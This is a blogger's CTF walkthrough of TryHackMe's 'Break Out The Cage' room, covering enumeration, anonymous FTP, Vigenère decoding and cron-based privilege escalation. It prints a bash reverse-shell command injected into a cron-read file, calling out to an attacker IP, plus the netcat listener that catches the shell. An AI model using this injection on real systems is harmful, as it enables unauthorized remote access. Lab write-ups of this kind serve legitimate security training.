---
draft: true
title: Break Out The Cage
ctf: ''
platform: TryHackMe
date: 2026-05-08
image: ''
description: ''
ctf_link: https://tryhackme.com/room/breakoutthecage1
difficulty: Easy
---

```plain
[nocteln@arch breakoutthecage]$ cat nmap_scan 
# Nmap 7.99 scan initiated Fri May  8 19:10:05 2026 as: nmap -sV -o nmap_scan 10.82.169.149
Nmap scan report for 10.82.169.149
Host is up (0.017s latency).
Not shown: 997 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Fri May  8 19:10:12 2026 -- 1 IP address (1 host up) scanned in 7.40 seconds
```

![website homepage](/img/writeups/pasted-image-1778264072334.png "website homepage")

By doeing a gobuster scan, we can see some things interestings : 

\`\`\`

[nocteln@arch breakoutthecage]$ gobuster dir -u http://$IP -w ../SecLists-master/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt 

===============================================================

Gobuster v3.8.2

by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)

===============================================================

[+] Url:                     http://10.82.169.149

[+] Method:                  GET

[+] Threads:                 10

[+] Wordlist:                ../SecLists-master/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt

[+] Negative Status codes:   404

[+] User Agent:              gobuster/3.8.2

[+] Timeout:                 10s

===============================================================

Starting gobuster in directory enumeration mode

===============================================================

images               (Status: 301) [Size: 315] [--> http://10.82.169.149/images/]

html                 (Status: 301) [Size: 313] [--> http://10.82.169.149/html/]

scripts              (Status: 301) [Size: 316] [--> http://10.82.169.149/scripts/]

contracts            (Status: 301) [Size: 318] [--> http://10.82.169.149/contracts/]

auditions            (Status: 301) [Size: 318] [--> http://10.82.169.149/auditions/]

server-status        (Status: 403) [Size: 278]

Progress: 220557 / 220557 (100.00%)

===============================================================

Finished

===============================================================

\`\`\`

First, the scripts directory, which contains differents scripts of movies

![](/img/writeups/20260508-191819.png)

![](/img/writeups/20260508-191838.png)

Secondly, we got /contracts with nothing but an empty folder in it

![](/img/writeups/20260508-191914.png)

And finaly /auditions, wich contain an mp3 file with weirds sounds in it.

![](/img/writeups/20260508-192022.png)

Interesting, I downloaded it using grep and imported it into audacity.

\`grep http://10.82.169.149/auditions/must_practice_corrupt_file.mp3 -o must_practice_file.mp3\`

And by looking at the spectrogram, BINGO! We got an image saying "namelesstwo"

![](/img/writeups/20260508-192742.png)

Now, what does it mean and where can I use this info?? Let's save that for later.

After some minutes of existentials thoughts, I did another nmap scan but with the option -sC added, from which I learned that the ftp server accepted anonymous connections.

![](/img/writeups/20260508-194925.png "nmap scan")

And with that I was logged with anonymous. There was only one file in it : \`dad_tasks\`, which I downloaded on my machine.

\`\`\`

[nocteln@arch breakoutthecage]$ ftp $IP

Connected to 10.82.169.149.

220 (vsFTPd 3.0.3)

Name (10.82.169.149:nocteln): anonymous

331 Please specify the password.

Password: 

230 Login successful.

Remote system type is UNIX.

Using binary mode to transfer files.

ftp> ls

200 PORT command successful. Consider using PASV.

150 Here comes the directory listing.

-rw-r--r--    1 0        0             396 May 25  2020 dad_tasks

226 Directory send OK.

ftp> get dad_tasks

200 PORT command successful. Consider using PASV.

150 Opening BINARY mode data connection for dad_tasks (396 bytes).

226 Transfer complete.

396 bytes received in 0.0001 seconds (6.8672 Mbytes/s)

ftp> 

\`\`\`

The dad_tasks file contain a string of random chars : \`UWFwdyBFZWtjbCAtIFB2ciBSTUtQLi4uWFpXIFZXVVIuLi4gVFRJIFhFRi4uLiBMQUEgWlJHUVJPISEhIQpTZncuIEtham5tYiB4c2kgb3d1b3dnZQpGYXouIFRtbCBma2ZyIHFnc2VpayBhZyBvcWVpYngKRWxqd3guIFhpbCBicWkgYWlrbGJ5d3FlClJzZnYuIFp3ZWwgdnZtIGltZWwgc3VtZWJ0IGxxd2RzZmsKWWVqci4gVHFlbmwgVnN3IHN2bnQgInVycXNqZXRwd2JuIGVpbnlqYW11IiB3Zi4KCkl6IGdsd3cgQSB5a2Z0ZWYuLi4uIFFqaHN2Ym91dW9leGNtdndrd3dhdGZsbHh1Z2hoYmJjbXlkaXp3bGtic2lkaXVzY3ds\`. At first I thought it might be the password and the answer to the first question but it wasnt.
Okay so this looks like base64. Le'ts go to cyberchef. By decoding from base64, we get this : 

```plain
Qapw Eekcl - Pvr RMKP...XZW VWUR... TTI XEF... LAA ZRGQRO!!!!
Sfw. Kajnmb xsi owuowge
Faz. Tml fkfr qgseik ag oqeibx
Eljwx. Xil bqi aiklbywqe
Rsfv. Zwel vvm imel sumebt lqwdsfk
Yejr. Tqenl Vsw svnt "urqsjetpwbn einyjamu" wf.

Iz glww A ykftef.... Qjhsvbouuoexcmvwkwwatfllxughhbbcmydizwlkbsidiuscwl
```

This isn't readable so let's see if we can get something from this. I tried Cesar cypher,  xor with "endlesstwo" as a key, nothing worked. 
After asking my good friend Gemini for a list of all possibles encryption methods, I got the good one : Vigenere with the key we found : endlesstwo. And with that, we got our first question solved!

![](/img/writeups/20260508-200415.png "cyberchef result")

## Connecting with ssh

Now that we got Weston's password, we can connect with ssh to his account.

![SSH connection](/img/writeups/20260508-200659.png "SSH connection")

There is nothing interesting in the home directory. So I tried to see what Weston could execute as root and found something interesting.

![](/img/writeups/20260508-201801.png)

This script was just something to broadcast a message : 
\`\`\`bash

weston@national-treasure:\~$ cat /usr/bin/bees 

#!/bin/bash

wall "AHHHHHHH THEEEEE BEEEEESSSS!!!!!!!!"

\`\`\`

I think this was a rabbit hole.

Next thing I look is the /opt/ and god I found something interesting. In it was a script which would run commands by picking random sentences from a file. I have the permissions to edit the file from which the script picks the quote so I removed all the quotes and added a revershell instead

![Uploaded image preview](/img/writeups/20260508-202625.png)

\`\`\`bash

weston@national-treasure:/opt/.dads_scripts/.files$ echo "; bash -c 'bash -i >& /dev/tcp/192.168.137.101/4444 0>&1'" > .quotes   

weston@national-treasure:/opt/.dads_scripts/.files$ cat .quotes 

sh -i >& /dev/tcp/192.168.255.255/4444 0>&1

weston@national-treasure:/opt/.dads_scripts/.files$ 

\`\`\`

And now, let's wait for the cronjob to execute and give us a reverseshell. And BOOM we got connected as Cage

\`\`\`

[nocteln@arch \~]$ nc -lvnp 4444

Listening on 0.0.0.0 4444

Connection received on 10.82.169.149 56238

bash: cannot set terminal process group (2062): Inappropriate ioctl for device

bash: no job control in this shell

cage@national-treasure:\~$ 

\`\`\`

And with that, our user flag

![user flag](/img/writeups/20260508-205006.png)

# root access

Okay, now that we have access to cage's account, let's try to get the root. By looking at the files with have access, we can see we got 3 emails : 

\`\`\`

cage@national-treasure:/home/cage/email_backup# cat email_\*

From - SeanArcher@BigManAgents.com

To - Cage@nationaltreasure.com

Hey Cage!

There's rumours of a Face/Off sequel, Face/Off 2 - Face On. It's supposedly only in the

planning stages at the moment. I've put a good word in for you, if you're lucky we 

might be able to get you a part of an angry shop keeping or something? Would you be up

for that, the money would be good and it'd look good on your acting CV.

Regards

Sean Archer

From - Cage@nationaltreasure.com

To - SeanArcher@BigManAgents.com

Dear Sean

We've had this discussion before Sean, I want bigger roles, I'm meant for greater things.

Why aren't you finding roles like Batman, The Little Mermaid(I'd make a great Sebastian!),

the new Home Alone film and why oh why Sean, tell me why Sean. Why did I not get a role in the

new fan made Star Wars films?! There was 3 of them! 3 Sean! I mean yes they were terrible films.

I could of made them great... great Sean.... I think you're missing my true potential.

On a much lighter note thank you for helping me set up my home server, Weston helped too, but

not overally greatly. I gave him some smaller jobs. Whats your username on here? Root?

Yours

Cage

From - Cage@nationaltreasure.com

To - Weston@nationaltreasure.com

Hey Son

Buddy, Sean left a note on his desk with some really strange writing on it. I quickly wrote

down what it said. Could you look into it please? I think it could be something to do with his

account on here. I want to know what he's hiding from me... I might need a new agent. Pretty

sure he's out to get me. The note said:

haiinspsyanileph

The guy also seems obsessed with my face lately. He came him wearing a mask of my face...

was rather odd. Imagine wearing his ugly face.... I wouldnt be able to FACE that!! 

hahahahahahahahahahahahahahahaahah get it Weston! FACE THAT!!!! hahahahahahahhaha

ahahahhahaha. Ahhh Face it... he's just odd. 

Regards

The Legend - Cage

\`\`\`

From those emails, we notice that the root user is sean and his password may be \`haiinspsyanileph\`. But it isnt. So the password is encrypted. We used vigenere before so I try this one too with the key "face" as it is repeated multiple times in the third email and BINGO, we got sean password and we can now login to his account and get the root flag.

![](/img/writeups/20260508-210155.png)

![](/img/writeups/20260508-210345.png)

# Conclusion

This challenge was very interesting. I learned to watch audio files for hidden messages, to decrypt vigenere encryption and to use programs made by users to get access to things I wasn't supposed to.
